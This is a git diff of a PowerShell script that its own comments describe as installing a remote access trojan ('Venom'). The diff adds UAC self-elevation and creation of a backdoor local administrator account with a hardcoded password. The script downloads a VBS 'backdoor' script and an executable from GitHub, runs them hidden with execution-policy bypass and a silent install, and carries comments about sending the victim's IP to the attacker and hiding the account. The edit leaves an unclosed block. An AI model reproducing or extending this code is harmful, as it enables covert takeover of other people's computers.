@@ -5,27 +5,20 @@ function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
-#create admin for rat
-function Create-NewLocalAdmin {
-    [CmdletBinding()]
-    param (
-        [string] $NewLocalAdmin,
-        [securestring] $Password
-    )
-    begin {
-    }
-    process {
-        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
-        Write-Verbose "$NewLocalAdmin local user created"
-        Add-LocalGroupmember -Group "Administrators" -Member "$NewLocalAdmin"
-        Write-Verbose "$NewLocalAdmin added to the local administrator group"
-    }
-    end {
-    }
-}
-$NewLocalAdmin = "Venom"
-$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
-Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+#create admin
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
+    Start-Process powershell -Verb runAs -ArgumentList $arguments
+    Exit
+} else {
+    # Create a new local admin account
+    $username = "Venom"
+    $password = ConvertTo-SecureString "V3n0m" -AsPlainText -Force
+    New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
+    Add-LocalGroupMember -Group "Administrators" -Member $username
+
+
 
 ## variables
 $wd = random_text
@@ -34,9 +27,9 @@ $initial_dir = Get-Location
 
 
 # create admin user
-$NewLocalAdmin = "Venom"
-$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
-Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+#$NewLocalAdmin = "Venom"
+#$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
+#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # send ip to attacker
 #./smtp.ps1
@@ -68,9 +61,11 @@ Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master
 #visual bsic script to install backdoor
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty2.vbs -OutFile "calty2.vbs"
 
-powershell powershell.exe -windowstyle hidden -ep bypass $path ./attempt1.exe
+powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
 .\attempt1.exe; ./calty2
+    # Install the attempt1.exe file
+Start-Process -FilePath "$env:temp/$wd/attempt1.exe" -ArgumentList "/silent" -Wait
 
 # hide venom user
 pause
